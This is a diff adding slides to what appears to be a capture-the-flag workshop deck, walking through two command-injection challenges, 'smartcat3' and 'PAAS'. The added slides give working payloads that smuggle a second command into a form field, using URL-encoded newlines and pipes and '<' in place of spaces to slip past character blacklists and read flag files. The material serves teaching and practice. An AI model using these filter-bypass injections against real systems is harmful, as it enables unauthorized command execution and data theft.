@@ -510,6 +510,39 @@ If we try to input a special character, we get:
 
 ---
 
+## smartcat3 - Exploitation
+
+<div class="content-center">
+
+1. Try injecting special characters directly - the blacklist blocks them, so attempt **URL encoding** to bypass it
+
+<br>
+
+2. Use a URL-encoded newline (`%0a`) as a command separator, since `;`, `|` and `&` are blacklisted: <br>
+
+```python
+dest=google.it%0afind
+```
+
+<br/>
+
+
+3. Confirm command execution - if `find` returns output, the injection works!
+
+<br>
+
+4. Read the flag using `cat` with `/` replacing spaces (spaces are blacklisted): <br>
+
+```python
+dest=google.it%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
+```
+
+
+
+</div>
+
+---
+
 <!-- .slide: data-state="break-blue hide-controls" -->
 
 # PAAS
@@ -552,6 +585,30 @@ Inspecting the page source reveals that the input is encoded with `btoa()` (base
 
 
 <img src="./img/paas1.png" style="height: 600px;" />
+
+
+
+</div>
+
+---
+
+## PAAS - Exploitation
+
+<div class="content-center">
+
+1. Try sending `ls` (base64-encoded) → the server returns `Invalid number`, hinting that a valid number must be part of the input
+
+<br>
+
+2. Try `10|ls` (base64-encoded) → the server returns `Invalid character`, suggesting `|` is blacklisted
+
+<br>
+
+3. URL-encode `|` as `%7C` and try `10%7Cls` (base64-encoded) → it works, revealing a `flag.txt` file!
+
+<br>
+
+4. Apply the same trick to read the flag → URL-encode `|` and `<` and send `10%7Ccat%3Cflag.txt` (base64-encoded)
 
 
 
